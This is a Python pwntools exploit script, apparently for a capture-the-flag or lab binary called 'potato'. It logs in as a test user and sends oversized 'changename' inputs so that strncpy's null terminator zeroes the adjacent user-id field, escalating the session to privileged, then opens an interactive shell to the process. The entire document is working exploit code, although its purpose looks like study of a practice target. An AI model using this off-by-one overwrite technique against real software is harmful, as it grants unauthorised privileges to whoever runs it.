#!/usr/bin/env python3

from pwn import *
from ropgadget import *
from struct import pack

import sys

elf = ELF("./potato2/potato")
context.binary = elf
context.arch = 'i386'
context.bits = 32
context.endian = 'little'
context.os = 'linux'

p = elf.process(["console"], stdin=PTY, aslr=False) # stdin=PTY for "getpass" password input
gdb.attach(p, '''
break main
#break main.c:119
break func.c:188
break func.c:191
continue
''')

print(p.recvuntil(b"cmd> ")) # username
p.sendline(b"login")
# test user
p.sendline(b"peter")
p.sendline(b"12345")
print(p.recvuntil(b"cmd> ")) # username

# overwrite user structure with user-chosen id: 0
# This overwrites the bytes of the global user-id via the strncpy() call in func.c, 190
# since strncpy adds a null terminator at session.logged_in_user->name[54]
p.sendline(b"changename")
payload=b"\x41"*50 + b"\x42"*3 + b"\x0a"
p.sendline(payload)

# Repeat the same for session.logged_in_user->name[53]
p.sendline(b"changename")
payload=b"\x41"*50 + b"\x42"*2 + b"\x0a"
p.sendline(payload)

# all bytes in session.logged_in_user->id are now zero, we are privileged
# change name back to original
p.sendline(b"changename")
payload=b"peter" + b"\x0a"
p.sendline(payload)

p.interactive()
